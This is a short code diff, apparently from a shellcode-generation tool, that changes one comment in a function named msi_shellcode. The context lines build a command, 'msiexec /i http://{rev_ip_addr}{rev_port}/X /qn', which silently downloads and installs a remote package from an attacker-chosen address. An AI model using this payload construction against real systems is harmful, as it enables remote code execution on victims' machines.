@@ -292,7 +292,7 @@ def msi_shellcode(rev_ip_addr, rev_port, breakpoint=0):
     else:
         rev_port = (":" + rev_port)
 
-    # align the string to 4 bytes (pls tell my why it only works with this ... the push string function works fine)
+    # align the string to 4 bytes (to keep the stack aligned)
     msi_exec_str = f"msiexec /i http://{rev_ip_addr}{rev_port}/X /qn"
     msi_exec_str += " " * (len(msi_exec_str) % 4)
 
